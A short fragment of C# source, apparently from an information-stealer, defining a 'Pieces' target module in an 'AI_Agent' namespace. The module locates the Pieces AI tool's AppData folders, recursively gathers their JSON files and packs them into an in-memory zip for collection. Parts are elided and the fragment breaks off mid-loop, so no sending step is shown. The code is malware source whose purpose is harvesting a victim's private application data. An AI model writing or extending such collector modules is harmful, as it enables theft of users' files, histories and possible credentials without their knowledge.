...
namespace Intelix.Targets.AI_Agent
{
    public class Pieces : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            ...
            string[] paths = {
                Path.Combine(appdata, "com.pieces.os"),
                Path.Combine(local, "Pieces")
            };
            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;
                var entry = new Counter.CounterApplications { Name = "Pieces" };
                foreach (string file in Directory.GetFiles(dir, "*.json", SearchOption.AllDirectories))
                {
                    ...
                    try
                    {
                        string rel = "AI-Agent\\Pieces\\" + Path.GetFileName(file);
